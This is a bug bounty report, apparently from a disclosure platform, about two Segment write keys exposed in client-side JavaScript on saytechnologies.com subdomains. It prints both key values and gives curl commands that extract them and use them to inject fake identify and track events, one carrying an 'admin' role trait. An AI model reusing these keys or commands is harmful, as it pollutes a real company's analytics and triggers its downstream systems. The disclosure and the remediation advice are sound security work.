# REDACTED-PLATFORM Report [REDACTED-REPORT-ID]

**Title:** Multiple Segment API Write Keys Exposed in Client-Side JavaScript  
**Program:** [REDACTED-COMPANY] / [REDACTED-COMPANY] Bounty  
**Reporter:** [REDACTED-USERNAME]  
**Date Submitted:** March 14, 2026, 7:52am UTC  
**Status:** RESOLVED / APPROVED  
**Closed:** Duplicate of #3393209 (original reporter not identified)

## Vulnerability Summary

Multiple Segment API Write Keys are exposed in client-side JavaScript code across multiple subdomains of `saytechnologies.com`, allowing attackers to inject fake analytics data, create fake user profiles, and pollute business metrics.

**Keys Exposed:**
- **Key 1:** `brrdnbw5HSlph3wAjuxqh9UncR8XUu3X` (found on `voting.saytechnologies.com`)
- **Key 2:** `hbS9nGsLvHIJTFwIRypuPEErEWSg3Gvp` (found on `issuer.saytechnologies.com`)

---

## Proof of Concept

**Step 1: Extract keys from source code**
```bash
curl -s "https://voting.saytechnologies.com/" -H "X-Bug-Bounty: RAHAD" -H "X-Test-Account-Email: whitewarrior813@proton.me" | grep -o 'brrdnbw5HSlph3wAjuxqh9UncR8XUu3X'
curl -s "https://issuer.saytechnologies.com/" -H "X-Bug-Bounty: RAHAD" -H "X-Test-Account-Email: whitewarrior813@proton.me" | grep -o 'hbS9nGsLvHIJTFwIRypuPEErEWSg3Gvp'
```

Both commands return the respective API keys, confirming they are present in the source code.

**Step 2: Test Key #1 with Segment Identify Endpoint**
```bash
curl -X POST "https://api.segment.io/v1/identify" \
-u "brrdnbw5HSlph3wAjuxqh9UncR8XUu3X:" \
-H "Content-Type: application/json" \
-d '{"userId":"REDACTED-TEST","traits":{"email":"test@test.com","role":"admin"}}'
```
**Response:** `{"success": true}`

**Step 3: Test Key #2 with Segment Track Endpoint**
```bash
curl -X POST "https://api.segment.io/v1/track" \
-u "hbS9nGsLvHIJTFwIRypuPEErEWSg3Gvp:" \
-H "Content-Type: application/json" \
-d '{"event":"Test Event","userId":"REDACTED-TEST","properties":{"test":true}}'
```
**Response:** `{"success": true}`

## Impact

Both keys were tested and confirmed working with actual API responses showing `{"success": true}`. The keys were extracted directly from the source code of the affected subdomains and successfully used to inject fake data into Segment analytics.

**Attackers can:**
- Inject fake analytics events (track, identify, page)
- Create fake user profiles with arbitrary traits
- Pollute business metrics and revenue data
- Trigger downstream integrations (email, ads, CRM)
- Cause compliance/reporting issues (GDPR, financial)

**CVSS:** 5.3 (Medium) — Information exposure with demonstrable impact  
**Severity:** P2 (High) per report title

## Recommended Solution

**Immediate Actions (Within 24-48 hours):**
- Rotate Both Segment Write Keys [CRITICAL]
- Access Segment dashboard to revoke old keys and generate new ones
- Audit Segment Data — check for fake users/events already injected
- Review recent analytics for anomalies
- Search for user ID: "REDACTED-TEST" (test data created during responsible testing)

**Move Keys to Server-Side:**
- Use environment variables (e.g., `SEGMENT_WRITE_KEY`)
- Never expose keys in client-side JavaScript
- Use server-side Segment SDKs (Node.js, Python, Go, etc.)

**Long-Term Actions (Within 30 days):**
- Implement Key Rotation Policy — rotate keys every 90 days
- Automate rotation process
- Monitor for key exposure
- Security Training — train developers on secret management
- Include in code review checklist
- Add pre-commit hooks to prevent key commits (use tools like git-secrets, TruffleHog)
- Monitor for Exposure — set up alerts for key usage from unexpected origins
- Use tools like GitGuardian, Detectify, or Segment's built-in monitoring
